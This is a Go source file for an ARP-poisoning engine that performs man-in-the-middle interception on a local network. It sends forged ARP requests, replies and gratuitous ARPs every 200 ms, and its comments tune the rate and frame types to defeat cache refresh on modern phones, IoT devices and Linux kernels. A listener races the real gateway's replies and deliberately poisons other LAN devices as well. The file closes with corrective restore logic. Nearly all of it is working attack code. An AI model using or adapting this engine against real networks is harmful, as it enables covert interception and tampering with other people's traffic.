// Package arpengine sends unsolicited ARP replies on a cadence to perform
// MITM-style ARP poisoning, and emits corrective ARPs on stop.
package arpengine

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Target is one host being poisoned. The same struct is used by
// policycompiler (which imports this package for the type) so the public
// field names match the compiler's call sites.
type Target struct {
	MAC   net.HardwareAddr
	IP    net.IP
	GwMAC net.HardwareAddr
	GwIP  net.IP
}

// ActivePoison is the public view of an in-flight poison.
type ActivePoison struct {
	Target  Target
	Started time.Time
}

// Engine manages the set of in-flight ARP poisons.
type Engine struct {
	iface   string
	opMAC   net.HardwareAddr
	cadence time.Duration
	mu      sync.Mutex
	active  map[string]*runner // key: TargetMAC.String()
}

type runner struct {
	target  Target
	cancel  context.CancelFunc
	started time.Time
	done    chan struct{}
}

// copyTarget returns a deep copy of t so callers can't mutate engine-internal
// slice backing arrays.
func copyTarget(t Target) Target {
	return Target{
		MAC:   append(net.HardwareAddr{}, t.MAC...),
		IP:    append(net.IP{}, t.IP...),
		GwMAC: append(net.HardwareAddr{}, t.GwMAC...),
		GwIP:  append(net.IP{}, t.GwIP...),
	}
}

// New returns an engine bound to a specific interface and operator MAC.
// cadence=0 selects the default of 200 ms — modern Android/iOS kernels
// re-probe the gateway aggressively (often every 1-2 s, with bursts
// triggered by traffic), so a 1 Hz poison rate frequently loses the race
// and the victim's cache reverts to the real gateway MAC. 200 ms gives
// us 5 poison rounds per second per target, which empirically keeps
// modern phones' caches stuck on the operator's MAC.
func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
	if cadence == 0 {
		cadence = 200 * time.Millisecond
	}
	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, active: map[string]*runner{}}
}

// Start begins poisoning t. Idempotent: starting an already-active target
// is a no-op (returns nil without restarting).
func (e *Engine) Start(t Target) error {
	key := t.MAC.String()
	e.mu.Lock()
	if _, exists := e.active[key]; exists {
		e.mu.Unlock()
		return nil
	}
	e.mu.Unlock()

	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s: %w", e.iface, err)
	}

	e.mu.Lock()
	// Recheck after the gap — another caller may have started the same target.
	if _, exists := e.active[key]; exists {
		e.mu.Unlock()
		handle.Close()
		return nil
	}
	ctx, cancel := context.WithCancel(context.Background())
	r := &runner{target: t, cancel: cancel, started: time.Now(), done: make(chan struct{})}
	e.active[key] = r
	e.mu.Unlock()

	go e.loop(ctx, handle, t, r.done)
	// Also start a race-respond listener: a parallel pcap handle that
	// watches for the victim's ARP requests asking for the gateway IP
	// (and vice-versa). When seen, we respond IMMEDIATELY claiming the
	// operator's MAC, racing the real gateway's reply. On Wi-Fi the
	// operator is often closer L2-wise than the real gateway, so our
	// frame lands first and the victim's cache gets stuck on us.
	listenHandle, lerr := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if lerr == nil {
		// BPF filter at the kernel level so we don't waste cycles parsing
		// non-ARP frames in user space.
		_ = listenHandle.SetBPFFilter("arp")
		go e.raceListener(ctx, listenHandle, t)
	}
	return nil
}

// raceListener watches for ARP traffic involving the target or gateway
// and emits an immediate poisoned reply that races the real gateway's
// response. Closes its handle on ctx cancel.
func (e *Engine) raceListener(ctx context.Context, handle *pcap.Handle, t Target) {
	defer handle.Close()

	// Pre-build the two race replies once.
	repGwAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
	repVicAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)

	// Close the read handle when ctx is cancelled so the packet source
	// stops blocking and the goroutine returns.
	go func() {
		<-ctx.Done()
		handle.Close()
	}()

	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	tIP4 := t.IP.To4()
	gwIP4 := t.GwIP.To4()
	for pkt := range src.Packets() {
		if ctx.Err() != nil {
			return
		}
		al := pkt.Layer(layers.LayerTypeARP)
		if al == nil {
			continue
		}
		arp := al.(*layers.ARP)
		if arp.Operation != layers.ARPRequest {
			continue
		}
		// Skip our own poison frames so we don't race ourselves into
		// a self-feedback loop.
		if bytes.Equal(arp.SourceHwAddress, e.opMAC) {
			continue
		}
		dst := net.IP(arp.DstProtAddress).To4()
		switch {
		case dst.Equal(gwIP4):
			// Anyone asking "who has the gateway?" — racing reply with
			// our MAC poisons their cache before the real gateway can
			// answer. We don't even need it to be the specific victim;
			// other devices on the LAN benefit too.
			_ = handle.WritePacketData(repGwAtOp)
		case dst.Equal(tIP4):
			// Conversely, anyone asking "who has the victim?" — typically
			// the gateway itself when it has return traffic for the
			// victim. Race-reply so the gateway's cache stays poisoned.
			_ = handle.WritePacketData(repVicAtOp)
		}
	}
}

func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done chan struct{}) {
	defer close(done)
	defer handle.Close()
	tick := time.NewTicker(e.cadence)
	defer tick.Stop()
	// Pre-build the six frame variants once per loop. Re-serialising 30
	// frames per second per target gets expensive; the buffers don't
	// change.
	reqVicGwAtOp, _ := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
	repVicGwAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
	reqGwVicAtOp, _ := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
	repGwVicAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
	garpGwAtOp, _ := buildGratuitousARP(e.opMAC, e.opMAC, t.GwIP)
	garpVicAtOp, _ := buildGratuitousARP(e.opMAC, e.opMAC, t.IP)

	send := func() {
		// Six frames per cycle:
		//   1+2: tell victim "GwIP is at opMAC"  (unicast req + rep)
		//   3+4: tell gateway "VicIP is at opMAC" (unicast req + rep)
		//   5+6: broadcast gratuitous announcing the same on each side
		//
		// Different receivers accept different forms — Linux kernels
		// learn from REQUESTs unconditionally, modern Android phones
		// often only accept gratuitous-with-tip==sip, and some IoT
		// devices only update on REPLY. Sending all six per cycle
		// maximises the probability that the receiver's cache flips.
		_ = handle.WritePacketData(reqVicGwAtOp)
		_ = handle.WritePacketData(repVicGwAtOp)
		_ = handle.WritePacketData(reqGwVicAtOp)
		_ = handle.WritePacketData(repGwVicAtOp)
		_ = handle.WritePacketData(garpGwAtOp)
		_ = handle.WritePacketData(garpVicAtOp)
	}
	send() // immediate first emission
	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			send()
		}
	}
}

// Stop halts poisoning of the named target and emits corrective ARPs
// asserting the real (gw,target) mappings. Blocks until the poison
// goroutine exits AND the corrective sequence completes — total wait is
// approximately 3*cadence (default 3 s). No-op for unknown targets.
func (e *Engine) Stop(t Target) error {
	e.mu.Lock()
	r, ok := e.active[t.MAC.String()]
	if !ok {
		e.mu.Unlock()
		return nil
	}
	delete(e.active, t.MAC.String())
	e.mu.Unlock()
	r.cancel()
	<-r.done // wait for the poison goroutine to actually stop and close its handle

	// Wait past Linux's neighbour-table locktime (default 1s) so the
	// receiving kernel won't silently drop our corrective frames as a
	// race with the just-completed poison send. is_garp bypasses
	// locktime in newer kernels, but older/configured kernels can still
	// reject — sleeping here makes the corrective deterministic.
	time.Sleep(1100 * time.Millisecond)

	// now safe to open corrective handle
	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s for corrective: %w", e.iface, err)
	}
	defer handle.Close()
	// Restore the real (gw, target) mappings on both sides. Send THREE
	// forms per iteration so the receiver kernel cannot silently drop the
	// update on any of its neighbour-state code paths:
	//   - unicast ARP REQUEST: forces sender-info learning even on
	//     REACHABLE entries (Linux's request handler always updates)
	//   - unicast ARP REPLY: covers receivers that prefer reply-form
	//   - gratuitous (broadcast) ARP REQUEST: tip==sip, flagged as
	//     is_garp → NEIGH_UPDATE_F_OVERRIDE bypasses locktime
	// ethL2Src=opMAC throughout keeps the bridge FDB clean.
	reqGwToTarget, errGT := buildARPRequest(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
	repGwToTarget, errGR := buildARPReply(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
	reqTargetToGw, errTT := buildARPRequest(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
	repTargetToGw, errTR := buildARPReply(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
	garpGw, errG1 := buildGratuitousARP(e.opMAC, t.GwMAC, t.GwIP)
	garpTarget, errG2 := buildGratuitousARP(e.opMAC, t.MAC, t.IP)
	for i := 0; i < 5; i++ {
		if errGT == nil {
			_ = handle.WritePacketData(reqGwToTarget)
		}
		if errGR == nil {
			_ = handle.WritePacketData(repGwToTarget)
		}
		if errTT == nil {
			_ = handle.WritePacketData(reqTargetToGw)
		}
		if errTR == nil {
			_ = handle.WritePacketData(repTargetToGw)
		}
		if errG1 == nil {
			_ = handle.WritePacketData(garpGw)
		}
		if errG2 == nil {
			_ = handle.WritePacketData(garpTarget)
		}
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// StopAll halts every active poison. Errors are aggregated.
func (e *Engine) StopAll() error {
	e.mu.Lock()
	targets := make([]Target, 0, len(e.active))
	for _, r := range e.active {
		targets = append(targets, r.target)
	}
	e.mu.Unlock()
	var errs []error
	for _, t := range targets {
		if err := e.Stop(t); err != nil {
			errs = append(errs, err)
		}
	}
	return errors.Join(errs...)
}

// Active returns a snapshot of in-flight poisons.
func (e *Engine) Active() []ActivePoison {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]ActivePoison, 0, len(e.active))
	for _, r := range e.active {
		out = append(out, ActivePoison{Target: copyTarget(r.target), Started: r.started})
	}
	return out
}
